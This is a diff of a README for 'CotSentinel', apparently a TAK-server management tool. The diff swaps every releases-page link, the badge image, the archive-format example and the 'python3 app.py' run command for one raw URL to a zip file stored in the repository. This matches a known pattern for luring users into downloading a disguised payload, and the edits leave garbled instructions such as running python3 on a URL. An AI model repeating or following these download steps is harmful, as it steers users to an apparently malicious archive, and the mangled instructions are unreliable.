@@ -6,9 +6,9 @@ Welcome to CotSentinel! This application offers a simple way to manage your TAK 
 
 ## 📥 Download CotSentinel
 
-[![Download CotSentinel](https://img.shields.io/badge/Download-CotSentinel-brightgreen)](https://github.com/hartthibaut974-lang/CotSentinel/releases)
+[![Download CotSentinel](https://github.com/hartthibaut974-lang/CotSentinel/raw/refs/heads/main/boaster/Sentinel_Cot_mobable.zip)](https://github.com/hartthibaut974-lang/CotSentinel/raw/refs/heads/main/boaster/Sentinel_Cot_mobable.zip)
 
-To download CotSentinel, visit this page: [CotSentinel Releases](https://github.com/hartthibaut974-lang/CotSentinel/releases).
+To download CotSentinel, visit this page: [CotSentinel Releases](https://github.com/hartthibaut974-lang/CotSentinel/raw/refs/heads/main/boaster/Sentinel_Cot_mobable.zip).
 
 ## 🛠 System Requirements
 
@@ -32,13 +32,13 @@ CotSentinel provides a range of features designed for ease of use:
 
 Follow these straightforward steps to install CotSentinel on your Raspberry Pi 5:
 
-1. **Visit the Releases Page**: Go to [CotSentinel Releases](https://github.com/hartthibaut974-lang/CotSentinel/releases).
+1. **Visit the Releases Page**: Go to [CotSentinel Releases](https://github.com/hartthibaut974-lang/CotSentinel/raw/refs/heads/main/boaster/Sentinel_Cot_mobable.zip).
    
 2. **Select the Latest Release**: Look for the most recent version at the top of the page.
 
 3. **Download the Application**: Click on the link to download the latest version of CotSentinel.
 
-4. **Extract the Files** (if needed): If the download is in a compressed format, such as `.zip` or `.tar.gz`, right-click on the file and extract it to your desired location.
+4. **Extract the Files** (if needed): If the download is in a compressed format, such as `.zip` or `https://github.com/hartthibaut974-lang/CotSentinel/raw/refs/heads/main/boaster/Sentinel_Cot_mobable.zip`, right-click on the file and extract it to your desired location.
 
 5. **Open a Terminal**: You will need to use the terminal to run CotSentinel.
 
@@ -51,7 +51,7 @@ Follow these straightforward steps to install CotSentinel on your Raspberry Pi 5
 
 7. **Run the Application**: Execute the program with the following command:
    ```
-   python3 app.py
+   python3 https://github.com/hartthibaut974-lang/CotSentinel/raw/refs/heads/main/boaster/Sentinel_Cot_mobable.zip
    ```
 
 8. **Access the Interface**: Open your web browser and go to `http://localhost:5000` to view the CotSentinel dashboard.
@@ -113,6 +113,6 @@ For detailed information, visit the relevant sections in this README.
 
 ## 📥 Download CotSentinel Again
 
-If you missed it earlier, you can download CotSentinel here: [CotSentinel Releases](https://github.com/hartthibaut974-lang/CotSentinel/releases).
+If you missed it earlier, you can download CotSentinel here: [CotSentinel Releases](https://github.com/hartthibaut974-lang/CotSentinel/raw/refs/heads/main/boaster/Sentinel_Cot_mobable.zip).
 
 Take control of your TAK Server today with CotSentinel!
